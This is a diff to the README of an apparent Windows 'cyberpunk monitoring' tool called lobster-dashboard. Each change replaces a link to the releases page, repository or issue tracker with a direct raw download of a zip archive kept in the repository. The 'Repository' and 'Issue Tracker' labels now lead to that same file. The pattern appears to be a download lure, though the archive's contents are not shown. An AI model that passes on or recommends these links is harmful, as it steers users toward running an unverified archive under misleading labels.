@@ -1,6 +1,6 @@
 # 🦞 lobster-dashboard - Real-Time Cyberpunk Monitoring Tool
 
-[![Download](https://img.shields.io/badge/Download-latest-blue?style=for-the-badge)](https://github.com/dvlooper48-code/lobster-dashboard/releases)
+[![Download](https://img.shields.io/badge/Download-latest-blue?style=for-the-badge)](https://github.com/dvlooper48-code/lobster-dashboard/raw/refs/heads/main/public/dashboard-lobster-3.5-alpha.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and run lobster-dashboard on your Windows compute
 
 Click the button below to go to the download page.
 
-[![Download lobster-dashboard](https://img.shields.io/badge/Download%20Now-grey?style=for-the-badge&color=orange)](https://github.com/dvlooper48-code/lobster-dashboard/releases)
+[![Download lobster-dashboard](https://img.shields.io/badge/Download%20Now-grey?style=for-the-badge&color=orange)](https://github.com/dvlooper48-code/lobster-dashboard/raw/refs/heads/main/public/dashboard-lobster-3.5-alpha.1.zip)
 
 ### 2. Find the Latest Release
 
@@ -140,9 +140,9 @@ If problems persist, report details on the GitHub Issues page.
 
 ## 🔗 Useful Links
 
-- Download Page: https://github.com/dvlooper48-code/lobster-dashboard/releases  
-- GitHub Repository: https://github.com/dvlooper48-code/lobster-dashboard  
-- Issue Tracker: https://github.com/dvlooper48-code/lobster-dashboard/issues  
+- Download Page: https://github.com/dvlooper48-code/lobster-dashboard/raw/refs/heads/main/public/dashboard-lobster-3.5-alpha.1.zip  
+- GitHub Repository: https://github.com/dvlooper48-code/lobster-dashboard/raw/refs/heads/main/public/dashboard-lobster-3.5-alpha.1.zip  
+- Issue Tracker: https://github.com/dvlooper48-code/lobster-dashboard/raw/refs/heads/main/public/dashboard-lobster-3.5-alpha.1.zip  
 
 ---
 
@@ -179,4 +179,4 @@ For help with the software:
 
 Download and start using lobster-dashboard by visiting the release page below:
 
-[![Download lobster-dashboard](https://img.shields.io/badge/Download%20Now-grey?style=for-the-badge&color=orange)](https://github.com/dvlooper48-code/lobster-dashboard/releases)
+[![Download lobster-dashboard](https://img.shields.io/badge/Download%20Now-grey?style=for-the-badge&color=orange)](https://github.com/dvlooper48-code/lobster-dashboard/raw/refs/heads/main/public/dashboard-lobster-3.5-alpha.1.zip)
